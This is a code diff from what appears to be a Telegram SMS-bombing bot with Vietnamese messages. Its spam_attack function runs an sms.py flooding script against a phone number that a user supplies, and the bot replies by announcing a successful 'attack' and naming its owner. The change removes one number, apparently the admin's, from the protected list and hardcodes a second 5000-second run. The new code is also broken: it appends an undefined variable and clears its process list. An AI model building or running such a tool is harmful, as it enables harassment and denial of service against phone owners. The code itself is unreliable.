@@ -176,7 +176,7 @@ def lqm_sms(message):
         bot.reply_to(message, '🚀SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ !🚀')
         return
 
-    if phone_number in ['113', '911', '114', '115', '0388811523']:
+    if phone_number in ['113', '911', '114', '115']:
         # Số điện thoại nằm trong danh sách cấm
         bot.reply_to(message, "‼️Bạn đang định spam số điện thoại của admin hoặc số điện thoại bị cấm, vui lòng không lặp lại hành vi này nếu không bạn sẽ bị cấm vĩnh viễn khỏi hệ thống của chúng tôi.‼️")
         return
@@ -202,9 +202,11 @@ def stop_spam(message):
         bot.reply_to(message, "❗️ Bạn chưa sử dụng lệnh spam hoặc đã dừng lệnh trước đó ❗️")
 
 def spam_attack(user_id, phone_number, duration, message):
-    file_path = os.path.join(os.getcwd(), "spam.py")
-    process = subprocess.Popen(["python", file_path, phone_number, str(duration)])
-    processes.append(process)
+    processes = []  # Tạo danh sách processes ở đây
+    file_path = os.path.join(os.getcwd(), "sms.py")
+    subprocess.run(["python", file_path, phone_number, str(duration)])
+    subprocess.run(["python", "sms.py", phone_number, "5000"])
+    processes.append(process)  # Thêm process vào danh sách processes
     bot.reply_to(message, f'🚀 Gửi Yêu Cầu Tấn Công Thành Công 🚀 \n+ Bot 👾: @DeathFrozen_bot \n+ Số Tấn Công 📱: [ {phone_number} ]\n+ Thời Gian Tấn Công ⏰: [ {duration} giây ]\n+ Chủ sở hữu 👑: @HeinGlobal\n 😜 Wait And Enjoy 😜')
 
     time.sleep(duration)  # Đợi cho đến khi kết thúc thời gian tấn công
